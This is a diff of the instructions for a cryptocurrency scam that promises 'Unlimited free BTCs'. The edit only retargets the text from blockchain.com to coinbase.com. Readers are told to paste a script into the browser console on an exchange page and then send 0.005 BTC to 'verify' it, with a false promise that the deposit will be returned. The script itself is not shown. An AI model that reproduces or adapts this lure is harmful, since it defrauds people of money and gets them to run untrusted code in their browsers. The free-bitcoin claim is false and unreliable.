@@ -1,17 +1,17 @@
       STEPS TO LAUNCH THE SCRIPT
 
 1)Clear browsing data(Recommended Google chrome)
-2)Open https://www.blockchain.com/btc/unconfirmed-transactions
-3)On your Blockchain page right click with the mouse and choose "inspect element ;
+2)Open https://www.coinbase.com/btc/unconfirmed-transactions
+3)On your Coinbase page right click with the mouse and choose "inspect element ;
 4)Go to "Console" tab and paste the script;
 5)Press enter to start script;
 6)Done all Procedures recommended by the script
 7)Get your Unlimited free BTCs
 
-NOTE:Please Don`t select more than 2 BTC unconfirmed transactions if you selectafterany problem coming we are not responsible
+NOTE:Please Don`t select more than 2 BTC unconfirmed transactions if you select after any problem coming we are not responsible
 
-How to verify blockchain script:?Deposit to what showing after enter your script.That for security reasons so no one can use your script, and that amount 0.005 BTCyou deposit will back to your wallet after 1 confirm.
-the amount 0.005 BTC you deposit it's not a fee, it is for verify script with your ID, when verify is done the 0.005 BTC will show in your blockchain balance you canwithdraw it.
+How to verify coinbase script:?Deposit to what showing after enter your script.That for security reasons so no one can use your script, and that amount 0.005 BTCyou deposit will back to your wallet after 1 confirm.
+the amount 0.005 BTC you deposit it's not a fee, it is for verify script with your ID, when verify is done the 0.005 BTC will show in your coinbase balance you can withdraw it.
 
 
 ******* USE  THE SCRIPT  BELOW ***********
